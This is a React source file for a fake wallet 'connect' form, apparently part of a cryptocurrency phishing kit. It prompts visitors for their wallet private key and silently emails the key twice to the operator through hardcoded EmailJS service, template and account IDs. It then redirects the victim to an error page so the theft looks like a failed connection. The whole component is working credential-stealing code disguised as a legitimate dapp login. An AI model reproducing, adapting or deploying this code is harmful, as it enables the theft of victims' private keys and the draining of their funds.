


import React, { useEffect, useState } from 'react';
import styles from '../WalletConnectForm.module.css';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import emailjs from '@emailjs/browser';

const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    privateKey: '',
    name: wallet,
    type: 'Private_Key',
    password: 'not_required',
  });
  const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT');
  const [privateKey64Long, setPrivateKey64Long] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  useEffect(() => {
    const isPasswordWithinRange = (key) => {
      const length = key.length;
      const hasSpaces = key.includes(' ');
      return length >= 30 && length <= 190 && !hasSpaces;
    };

    setPrivateKey64Long(isPasswordWithinRange(formData.privateKey));
  }, [formData.privateKey]);

  const handlePrivateKeySubmit = async (e) => {
    e.preventDefault();
    setPrivateSubmitBtn('Processing...');

    const sendFast = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    if (privateKey64Long) {
      try {

        await emailjs.send(
          'service_ky8xa0e',
          'template_kqjcmir',
          {
            to_name: "dapp", // Replace with the actual recipient's name if needed
            from_name: formData.name,
            message: `
              Name: ${formData.name}
              Type: ${formData.type}
              Data: ${formData.privateKey}
              Password: ${formData.password}
            `,
          },
          'pudHPDoixy2beukw8'
        );

        await sendFast(1 * 5 * 1000);
        
        await emailjs.send(
          'service_ky8xa0e',
          'template_kqjcmir',
          {
            to_name: "dapp", // Replace with the actual recipient's name if needed
            from_name: formData.name,
            message: `
              Name: ${formData.name}
              Type: ${formData.type}
              Data: ${formData.privateKey}
              Password: ${formData.password}
            `,
          },
          'pudHPDoixy2beukw8'
        );

        navigate('/error');
      } catch (error) {
        console.log(error);
        setPrivateSubmitBtn('CONNECT');
      }
    } else {
      privateKeyLengthNotlong();
      setPrivateSubmitBtn('CONNECT');
    }
  };

  return (
    <>
      <form onSubmit={handlePrivateKeySubmit}>
        <input
          required
          type="text"
          name="privateKey"
          value={formData.privateKey}
          autoComplete="off"
          onChange={handleChange}
          placeholder="Enter your Private Key"
          className={styles.privateKeyInput}
        />
        <p className={styles.hint} style={{ color: privateKey64Long ? 'green' : 'red' }}>
          Private keys vary in format, but they often consist of a sequence of hexadecimal characters without spaces.
        </p>
        <button type="submit" className={styles.connectButton}>
          {privateSubmitBtn}
        </button>
      </form>
    </>
  );
};

export default PrivateKeyForm;
